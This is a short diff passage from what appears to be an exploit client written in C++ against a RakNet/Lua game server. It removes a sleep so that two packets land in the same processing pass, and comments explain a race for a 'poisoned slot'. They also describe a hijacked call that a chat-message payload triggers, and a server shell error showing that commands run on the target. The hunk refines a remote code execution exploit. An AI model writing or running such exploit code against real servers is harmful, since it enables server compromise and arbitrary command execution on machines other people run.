@@ -1304,7 +1304,14 @@ int main(int argc, char **argv)
           uint64_t s6 = sys & 0xffffffffffffULL; char sb[7]; memcpy(sb, &s6, 6); sb[6] = 0;
           RakString g = rstr(sb); bs.Write(g);
           int mo = 0, cn = 0; bs.Write(mo); bs.Write(cn); bool ps = false; bs.Write(ps);
-          snd(A, bs); } usleep(250000);
+          snd(A, bs); }
+        // DELIBERATELY no delay before 7d. Everything this client sends is RELIABLE_ORDERED on
+        // channel 0, so the server processes the two packets in order, and back-to-back they land
+        // in the same pass of the packet loop. Any gap here is a window for a Lua callback that is
+        // not ours to reach the poisoned slot first, and CoreScripts has a standing one:
+        // serverCore.lua:197 arms `UpdateTime` on a 1-second timer. A 250 ms sleep here lost the
+        // race roughly a quarter of the time, and the server said exactly what took the shot:
+        //     sh: 1: UpdateTime: not found
 
         // 7d. the payload, as an ordinary chat message. ProcessorChatMsg reaches
         //     Script::Call<OnPlayerSendMessage>, which spends the FIRST hijacked call on the
